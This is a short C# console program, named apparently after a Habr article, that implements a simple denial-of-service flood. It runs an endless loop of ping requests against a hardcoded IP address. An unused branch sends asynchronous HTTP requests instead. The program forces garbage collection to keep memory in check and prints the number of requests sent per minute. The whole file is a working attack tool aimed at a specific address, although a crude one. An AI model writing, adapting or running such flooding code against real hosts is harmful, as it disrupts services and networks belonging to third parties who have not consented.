using System.Net.NetworkInformation;
using System.Net;

namespace DoSAttacInHabr
{
    internal class Program
    {
        static int i;
        static void Main(string[] args)
        {
            a1(true);
        }
        static void a1(bool IsIP)
        {
            IPAddress ip = null;
            if (IsIP)
                //Если это атака IP, то парсим строку в textBox2
                ip = IPAddress.Parse("95.52.117.148");
            //Основной цикл
            RequestsPerMinute();
            while (true)
            {
                //Если это атака сайта:
                if (!IsIP)
                {
                    //Создаём запрос
                    var r = (HttpWebRequest)WebRequest.Create("http://" + ip);
                    //Начинаем слушать ответ
                    r.BeginGetResponse(new AsyncCallback((IAsyncResult res) => { }), null);
                }
                //Если это атака IP
                else
                {
                    var ping = new Ping();
                    //Если IP пропарсился нормально, то пингуем
                    if (ip != null)
                    {
                        ping.Send(ip);
                        //Console.WriteLine(i + " Requests");
                    }
                }
                //Переменная, которая содержит общее количество запросов
                i++;
                //Каждые 10000 раз вызываем сборщик мусора, иначе прога будет через минуту своей работы занимать около гигабайта ОЗУ
                if (i % 10000 == 0)
                    GC.Collect();
            }
        }

        static async Task RequestsPerMinute()
        {
            await Task.Delay(60000);
            Console.WriteLine(i); //37202
            Console.ReadKey();
        }
    }
}